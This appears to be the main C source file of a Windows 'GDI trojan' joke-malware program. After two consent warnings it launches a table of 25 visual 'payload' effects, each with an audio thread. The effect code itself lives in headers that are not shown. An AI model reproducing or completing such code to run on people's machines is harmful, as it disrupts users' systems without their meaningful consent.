#include "def.h"
#include "effects.h"
#include "audios.h"

void InitDPI() {
	HMODULE hModUser32 = LoadLibrary((char *)"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware){
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);
}

TROJAN_EXECUTE_STRUCT TrojanExecute[Effect_Num] = {
    /*payloads area*/
    {(void *)PAYLOAD01, (void *)AUDIO01},
    {(void *)PAYLOAD02, (void *)AUDIO02},
    {(void *)PAYLOAD03, (void *)AUDIO03},
    {(void *)PAYLOAD04, (void *)AUDIO04},
    {(void *)PAYLOAD05, (void *)AUDIO05},
    {(void *)PAYLOAD06, (void *)AUDIO06},
    {(void *)PAYLOAD07, (void *)AUDIO07},
    {(void *)PAYLOAD08, (void *)AUDIO08},
    {(void *)PAYLOAD09, (void *)AUDIO09},
    {(void *)PAYLOAD10, (void *)AUDIO10},
    /*GDIs area*/
    {(void *)GDI01, (void *)AUDIO01},
    {(void *)GDI02, (void *)AUDIO02},
    {(void *)GDI03, (void *)AUDIO03},
    {(void *)GDI04, (void *)AUDIO04},
    {(void *)GDI05, (void *)AUDIO05},
    {(void *)GDI06, (void *)AUDIO06},
    {(void *)GDI07, (void *)AUDIO07},
    {(void *)GDI08, (void *)AUDIO08},
    {(void *)GDI09, (void *)AUDIO09},
    {(void *)GDI10, (void *)AUDIO10},
    /*final payloads area*/
    {(void *)FINALPAYLOAD01, (void *)FINALAUDIO01},
    {(void *)FINALPAYLOAD02, (void *)FINALAUDIO02},
    {(void *)FINALPAYLOAD03, (void *)FINALAUDIO03},
    {(void *)FINALPAYLOAD04, (void *)FINALAUDIO04},
    {(void *)FINALPAYLOAD05, (void *)FINALAUDIO05}
};

void funcThread(TROJAN_EXECUTE_STRUCT trojan){
    HANDLE hThread = CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(trojan.effect), NULL, 0, NULL);
    HANDLE pHandle = CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(trojan.audio), NULL, 0, NULL);
    Sleep(15000);
    CloseHandle(pHandle);
    CloseHandle(hThread);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
}

int WINAPI ReallyPart(){
    InitDPI();
    for(int i = 0; i <= Effect_Num - 1; i++){
        funcThread(TrojanExecute[i]);
        Sleep(1000);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,PSTR lpCmdLine, INT nCmdShow){
    int mb = MessageBox(NULL, "This Malware will disturb you for some time,are you sure to run it?", "Warning", MB_YESNO+MB_ICONQUESTION);
    if(mb == IDYES){
        int mba = MessageBox(NULL, "This is last warning,the malware author couldn't assume legal liability,so are you sure to run it?", "Warning", MB_YESNO+MB_ICONWARNING);
        if(mba == IDYES){
            ReallyPart();
        }
    }
    return 0;
}